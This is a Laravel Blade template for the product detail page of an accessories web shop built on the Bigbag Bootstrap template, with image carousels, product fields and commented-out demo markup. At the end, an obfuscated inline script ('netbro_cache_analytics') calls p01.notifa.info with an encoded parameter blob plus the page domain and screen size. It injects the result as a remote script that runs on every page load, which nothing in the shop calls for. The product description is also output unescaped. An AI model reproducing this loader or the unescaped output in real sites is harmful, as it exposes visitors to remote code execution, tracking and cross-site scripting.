<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=utf-8" />

<head>

	<!-- SITE TITTLE -->
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Dunia Aksesoris</title>

	<!-- PLUGINS CSS STYLE -->
	<link href="{{asset ('/bigbag/plugins/jquery-ui/jquery-ui.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/font-awesome/css/font-awesome.min.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/selectbox/select_option1.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/fancybox/jquery.fancybox.min.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/iziToast/css/iziToast.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/prismjs/prism.css')}}" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="{{asset ('/bigbag/plugins/rs-plugin/css/settings.css')}}" media="screen">
	<link rel="stylesheet" type="text/css" href="{{asset ('/bigbag/plugins/slick/slick.css')}}" media="screen">
	<link rel="stylesheet" type="text/css" href="{{asset ('/bigbag/plugins/slick/slick-theme.css')}}" media="screen">

	<!-- CUSTOM CSS -->
	<link href="{{asset ('/bigbag/css/style.css')}}" rel="stylesheet">
	<link rel="stylesheet" href="{{asset ('/bigbag/css/default.css')}}" id="option_color">
	<link rel="stylesheet" type="text/css" href="{{ asset('/css/sweetalert2.css')}}">
	<link rel="stylesheet" type="text/css" href="{{ asset('/css/magiczoomplus.css')}}">

	<!-- Icons -->
	<link rel="shortcut icon" href="/img/head.png">

	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

</head>
<body class="body-wrapper version1">

	<!-- Preloader -->
	<div id="preloader" class="smooth-loader-wrapper">
		<div class="preloader_container">
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
		</div>
	</div>

	<div class="main-wrapper">

		<!-- HEADER -->
		<div class="header clearfix">

			<!-- TOPBAR -->

			<!-- NAVBAR -->
			@include('partials.frontend.navbar')
		</div>

		<!-- LIGHT SECTION -->
		<section class="lightSection clearfix pageHeader">
			<div class="container">
				<div class="row">
					<div class="col-md-6">
						
					</div>
				</div>
			</div>
		</section>

		<!-- MAIN CONTENT SECTION -->
		<section class="mainContent clearfix">
			<div class="container">
				<div class="row singleProduct">
					<div class="col-md-12">
						<div class="media flex-wrap">
							<div class="media-left productSlider">
								<div id="carousel" class="carousel slide" data-ride="carousel">
									<div class="carousel-inner">
										<div class="carousel-item active" data-thumb="0">
											<img src="{{ asset('/img/'.$barangs->foto1)}}" width="400px" height="500px">
										</div>
										<div class="carousel-item" data-thumb="1">
											<img src="{{ asset('/img/'.$barangs->foto2)}}" width="400px" height="500px">
										</div>
										<div class="carousel-item" data-thumb="2">
											<img src="{{ asset('/img/'.$barangs->foto3)}}" width="400px" height="500px">
										</div>
										<div class="carousel-item" data-thumb="3">
											<img src="{{ asset('/img/'.$barangs->foto4)}}" width="400px" height="500px">
										</div>
									</div>
								</div>
								<div class="clearfix">
									<div id="thumbcarousel" class="carousel slide" data-interval="false">
										<div class="carousel-inner">
											<div data-target="#carousel" data-slide-to="0" class="thumb">
												<img src="{{ asset('/img/'.$barangs->foto1)}}">
											</div>
											<div data-target="#carousel" data-slide-to="1" class="thumb">
												<img src="{{ asset('/img/'.$barangs->foto2)}}">
											</div>
											<div data-target="#carousel" data-slide-to="2" class="thumb">
												<img src="{{ asset('/img/'.$barangs->foto3)}}">
											</div>
											<div data-target="#carousel" data-slide-to="3" class="thumb">
												<img src="{{ asset('/img/'.$barangs->foto4)}}">
											</div>
										</div>
										<a class="left carousel-control" href="#thumbcarousel" role="button" data-slide="prev">
											<span class="glyphicon glyphicon-chevron-left"></span>
										</a>
										<a class="right carousel-control" href="#thumbcarousel" role="button" data-slide="next">
											<span class="glyphicon glyphicon-chevron-right"></span>
										</a>
									</div>
								</div>
							</div>
							<div class="media-body">
								<ul class="list-inline">
									<li><a href="/product"><i class="fa fa-reply" aria-hidden="true"></i>Continue Shopping</a></li>
								</ul>
								<h2>{{$barangs->nama_barang}}</h2>
								<h3>Rp {{$barangs->harga}},-</h3>
								<p>{!!($barangs->deskripsi)!!}</p>
								<!-- <span class="quick-drop">
									<select name="guiest_id3" id="guiest_id3" class="select-drop">
										<option value="0">Size</option>
										<option value="1">Small</option>
										<option value="2">Medium</option>
										<option value="3">Big</option>
									</select>
								</span>
								<span class="quick-drop resizeWidth">
									<select name="guiest_id4" id="guiest_id4" class="select-drop">
										<option value="0">Qty</option>
										<option value="1">1</option>
										<option value="2">2</option>
										<option value="3">3</option>
									</select>
								</span>
								<div class="btn-area">
									<a href="cart-page.html" class="btn btn-primary btn-default">Add to cart <i class="fa fa-angle-right" aria-hidden="true"></i></a>
								</div>
								<div class="tabArea">
									<ul class="nav nav-tabs bar-tabs">
										<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#details">details</a></li>
										<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#about-art">about art</a></li>
										<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#sizing">sizing</a></li>
										<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#shipping">shipping</a></li>
									</ul>
									<div class="tab-content">
										<div id="details" class="tab-pane fade show active">
											<p>LContrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin liter ature from 45 BC, making it over 2000 years old. Richard McClintock, a Latin professor at Hampden-Sydney College in Virginia.</p>
											<ul class="list-unstyled">
												<li>Black, Crew Neck</li>
												<li>75% Cotton, 25% Rayon</li>
												<li>Waterbased Ink</li>
												<li>Wash Cold, dry low</li>
											</ul>
										</div>
										<div id="about-art" class="tab-pane fade">
											<p>Nulla facilisi. Mauris efficitur, massa et iaculis accumsan, mauris velit ultrices purus, quis condimentum nibh dolor ut tortor. Donec egestas tortor quis mattis gravida. Ut efficitur elit vitae dignissim volutpat. </p>
										</div>
										<div id="sizing" class="tab-pane fade">
											<p>Praesent dui felis, gravida a auctor at, facilisis commodo ipsum. Cras eu faucibus justo. Nullam varius cursus nisi, sed elementum sem sagittis at. Nulla tellus massa, vestibulum a commodo facilisis, pulvinar convallis nunc.</p>
										</div>
										<div id="shipping" class="tab-pane fade">
											<p>Mauris lobortis augue ex, ut faucibus nisi mollis ac. Sed volutpat scelerisque ex ut ullamcorper. Cras at velit quis sapien dapibus laoreet a id odio. Sed sit amet accumsan ante, eu congue metus. Aenean eros tortor, cursus quis feugiat sed, vestibulum vel purus.</p>
										</div>
									</div>
								</div> -->
							</div>
						</div>
					</div>
				</div>
				<!-- <div class="page-header">
					<h4>Related Products</h4>
				</div>

				<div class="row productsContent">

					<div class="col-md-3 col-12 ">
						<div class="productBox">
							<div class="productImage clearfix">
								<img src="{{ asset('bigbag/img/products/products-01.jpg') }}" alt="products-img">
								<div class="productMasking">
									<ul class="list-inline btn-group" role="group">
										<li><a data-toggle="modal" href=".html" class="btn btn-default"><i class="fa fa-heart-o"></i></a></li>
										<li><a href="cart-page.html" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
										<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
									</ul>
								</div>
							</div>
							<div class="productCaption clearfix">
								<h5>Nike Sportswear</h5>
								<h3>$199</h3>
							</div>
						</div>
					</div>
					<div class="col-md-3 col-12 ">
						<div class="productBox">
							<div class="productImage clearfix">
								<img src="{{ asset('bigbag/img/products/products-02.jpg') }}" alt="products-img">
								<div class="productMasking">
									<ul class="list-inline btn-group" role="group">
										<li><a data-toggle="modal" href=".html" class="btn btn-default"><i class="fa fa-heart-o"></i></a></li>
										<li><a href="cart-page.html" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
										<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
									</ul>
								</div>
							</div>
							<div class="productCaption clearfix">
								<h5>Dip Dyed Sweater</h5>
								<h3>$249</h3>
							</div>
						</div>
					</div>
					<div class="col-md-3 col-12 ">
						<div class="productBox">
							<div class="productImage clearfix">
								<img src="{{ asset('bigbag/img/products/products-03.jpg') }}" alt="products-img">
								<div class="productMasking">
									<ul class="list-inline btn-group" role="group">
										<li><a data-toggle="modal" href=".html" class="btn btn-default"><i class="fa fa-heart-o"></i></a></li>
										<li><a href="cart-page.html" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
										<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
									</ul>
								</div>
							</div>
							<div class="productCaption clearfix">
								<h5>Scarf Ring Corner</h5>
								<h3>$179</h3>
							</div>
						</div>
					</div>
					<div class="col-md-3 col-12 ">
						<div class="productBox">
							<div class="productImage clearfix">
								<img src="{{ asset('bigbag/img/products/products-04.jpg') }}" alt="products-img">
								<div class="productMasking">
									<ul class="list-inline btn-group" role="group">
										<li><a data-toggle="modal" href=".html" class="btn btn-default"><i class="fa fa-heart-o"></i></a></li>
										<li><a href="cart-page.html" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
										<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
									</ul>
								</div>
							</div>
							<div class="productCaption clearfix">
								<h5>Sun Buddies</h5>
								<h3>$149</h3>
							</div>
						</div>
					</div>
				</div> -->
			</div>
		</section>

		<!-- FOOTER -->
		@include('partials.frontend.footer')
		<!-- <div class="footer clearfix">
			<div class="container">
				<div class="row">
					<div class="col-md-2 col-12">
						<div class="footerLink">
							<h5>Accessories</h5>
							<ul class="list-unstyled">
								<li><a href="#">Body care </a></li>
								<li><a href="#">Chambray </a></li>
								<li><a href="#">Floral </a></li>
								<li><a href="#">Rejuvination </a></li>
								<li><a href="#">Shaving </a></li>
								<li><a href="#">Toilette </a></li>
							</ul>
						</div>
					</div>
					<div class="col-md-2 col-12">
						<div class="footerLink">
							<h5>BRANDS</h5>
							<ul class="list-unstyled">
								<li><a href="#">Barbour </a></li>
								<li><a href="#">Brioni </a></li>
								<li><a href="#">Oliver Spencer</a></li>
								<li><a href="#">Belstaff</a></li>
							</ul>
						</div>
					</div>
					<div class="col-md-2 col-12">
						<div class="footerLink">
							<h5>Accessories</h5>
							<ul class="list-unstyled">
								<li><a href="#">Body care </a></li>
								<li><a href="#">Chambray </a></li>
								<li><a href="#">Floral </a></li>
								<li><a href="#">Rejuvination </a></li>
								<li><a href="#">Shaving </a></li>
								<li><a href="#">Toilette </a></li>
							</ul>
						</div>
					</div>
					<div class="col-md-2 col-12">
						<div class="footerLink">
							<h5>Get in Touch</h5>
							<ul class="list-unstyled">
								<li>Call us at (555)-555-5555</li>
								<li><a href="mailto:support@iamabdus.com">support@iamabdus.com</a></li>
							</ul>
							<ul class="list-inline">
								<li><a href="#"><i class="fa fa-twitter"></i></a></li>
								<li><a href="#"><i class="fa fa-facebook"></i></a></li>
								<li><a href="#"><i class="fa fa-dribbble"></i></a></li>
								<li><a href="#"><i class="fa fa-vimeo"></i></a></li>
								<li><a href="#"><i class="fa fa-tumblr"></i></a></li>
							</ul>
						</div>
					</div>
					<div class="col-md-4 col-12">
						<div class="newsletter clearfix">
							<h4>Newsletter</h4>
							<h3>Sign up now</h3>
							<p>Enter your email address and get notified about new products. We hate spam!</p>
							<div class="input-group">
								<input type="text" class="form-control" placeholder="your email address" aria-describedby="basic-addon2">
								<a href="#" class="input-group-addon" id="basic-addon2">go <i class="fa fa-chevron-right"></i></a>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div> -->

		<!-- COPY RIGHT -->
		<div class="copyRight clearfix">
			<div class="container">
				<div class="row">
					<div class="col-md-7 col-12">
						<p>&copy; 2017 Copyright Bigbag Store Bootstrap Template by <a target="_blank" href="http://www.iamabdus.com/">Abdus</a>.</p>
					</div>
					<div class="col-md-5 col-12">
						<ul class="list-inline">
							<li><img src="{{ asset('bigbag/img/home/footer/card1.png') }}"></li>
							<li><img src="{{ asset('bigbag/img/home/footer/card2.png') }}"></li>
							<li><img src="{{ asset('bigbag/img/home/footer/card3.png') }}"></li>
							<li><img src="{{ asset('bigbag/img/home/footer/card4.png') }}"></li>
						</ul>
					</div>
				</div>
			</div>
		</div>
	</div>

	<!-- LOGIN MODAL -->
	<!-- <div class="modal fade login-modal" id="login" tabindex="-1" role="dialog">
		<div class="modal-dialog">
			<div class="modal-content">
				<div class="modal-header justify-content-center">
					<h3 class="modal-title">log in</h3>
					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
				</div>
				<div class="modal-body">
					<form action="#" method="POST" role="form">
						<div class="form-group">
							<label for="">Enter Email</label>
							<input type="email" class="form-control" id="">
						</div>
						<div class="form-group">
							<label for="">Password</label>
							<input type="password" class="form-control" id="">
						</div>
						<div class="checkbox">
							<input id="checkbox-1" class="checkbox-custom form-check-input" name="checkbox-1" type="checkbox" checked>
							<label for="checkbox-1" class="checkbox-custom-label form-check-label">Remember me</label>
						</div>
						<button type="submit" class="btn btn-primary btn-block">log in</button>
						<button type="button" class="btn btn-link btn-block">Forgot Password?</button>
					</form>
				</div>
			</div>
		</div>
	</div> -->

	<!-- SIGN UP MODAL -->
	<!-- <div class="modal fade " id="signup" tabindex="-1" role="dialog">
		<div class="modal-dialog">
			<div class="modal-content">
				<div class="modal-header justify-content-center">
					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
					<h3 class="modal-title">Create an account</h3>
				</div>
				<div class="modal-body">
					<form action="#" method="POST" role="form">
						<div class="form-group">
							<label for="">Enter Email</label>
							<input type="email" class="form-control" id="">
						</div>
						<div class="form-group">
							<label for="">Password</label>
							<input type="password" class="form-control" id="">
						</div>
						<div class="form-group">
							<label for="">Confirm Password</label>
							<input type="password" class="form-control" id="">
						</div>
						<button type="submit" class="btn btn-primary btn-block">Sign up</button>
						<button type="button" class="btn btn-link btn-block">New User?</button>
					</form>
				</div>
			</div>
		</div>
	</div> -->

	<!-- PORDUCT QUICK VIEW MODAL -->
	<div class="modal fade quick-view" tabindex="-1" role="dialog">
		<div class="modal-dialog">
			<div class="modal-content">
				<div class="modal-body">
					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
					<div class="media flex-wrap">
						<div class="media-left px-0">
							<img class="media-object" src="{{ asset('bigbag/img/products/quick-view/quick-view-01.jpg') }}" alt="Image">
						</div>
						<div class="media-body">
							<h2>Old Skool Navy</h2>
							<h3>$149</h3>
							<p>Classic sneaker from Vans. Cotton canvas and suede upper. Textile lining with heel stabilizer and ankle support. Contrasting laces. Sits on a classic waffle rubber sole.</p>
							<span class="quick-drop">
								<select name="guiest_id3" id="guiest_id3" class="select-drop">
									<option value="0">Size</option>
									<option value="1">Size 1</option>
									<option value="2">Size 2</option>
									<option value="3">Size 3</option>
								</select>
							</span>
							<span class="quick-drop resizeWidth">
								<select name="guiest_id4" id="guiest_id4" class="select-drop">
									<option value="0">Qty</option>
									<option value="1">Qty 1</option>
									<option value="2">Qty 2</option>
									<option value="3">Qty 3</option>
								</select>
							</span>
							<div class="btn-area">
								<a href="#" class="btn btn-primary btn-block">Add to cart <i class="fa fa-angle-right" aria-hidden="true"></i></a>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>

	<script src="{{asset ('/bigbag/plugins/jquery/jquery.min.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/jquery/jquery-migrate-3.0.0.min.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/jquery-ui/jquery-ui.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/bootstrap/js/popper.min.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/bootstrap/js/bootstrap.min.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/rs-plugin/js/jquery.themepunch.tools.min.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/rs-plugin/js/jquery.themepunch.revolution.min.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/slick/slick.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/fancybox/jquery.fancybox.min.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/iziToast/js/iziToast.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/prismjs/prism.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/selectbox/jquery.selectbox-0.1.3.min.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/countdown/jquery.syotimer.js')}}"></script>
	<script src="{{asset ('/bigbag/plugins/velocity/velocity.min.js')}}"></script>
	<script src="{{asset ('/bigbag/js/custom.js')}}"></script>
	<script src="{{asset ('/js/sweetalert2.js') }}"></script>
	<script src="{{asset ('/js/magiczoomplus.js')}}"></script>

	<!-- <link href="{{asset ('/bigbag/options/optionswitch.css')}}" rel="stylesheet">
	<script src="{{asset ('/bigbag/options/optionswitcher.js')}}"></script> -->

	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m9BHH5nSgM%2bHDHaaHOKAlBoAyh8%2b53QgZ6tqcKOjHCUB0sleco81Yg7jGA3WsZRvbmIW0Sw%2fRzPz58v4B%2bdR0C%2f9fcrKJ4fJkjVgoKVLcvHQU1AItiXvbz%2bObOJQ3SatdAzr%2fvxrobVGQbN%2bD4SFNNyIIsrKib6G0TiNbrLBbTcN1FnCIAHhD0Hbh0bjwsdKI1EzOoO23YZN4W%2fpnn%2fGjyxVyYNQIURmAWRxAnFa7TCm9WZIbqFkW6x0vUDmy8MgfC%2bIn9PZyZ4zrSI%2bH7wITjw2Rl9GA1L4hHjgywcKqge8VG%2bXouXN95TkSurLcdnGaLaVwHj9kXJ%2bQdY8D%2fMZdczqgiVUD9Fp87c8ZAWwBYCs31%2f66rQiYaVgY5ZOY40ATajJHF6OVHVIVLVSSQvt8LzoWdTjESM7B1HsmIV%2bmu1av0ubj5YhwU0FduC5qJ7qYvyeMwhN47Ab09VbQz2LGXXx66Nnfy%2bsX" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</body>
</html>

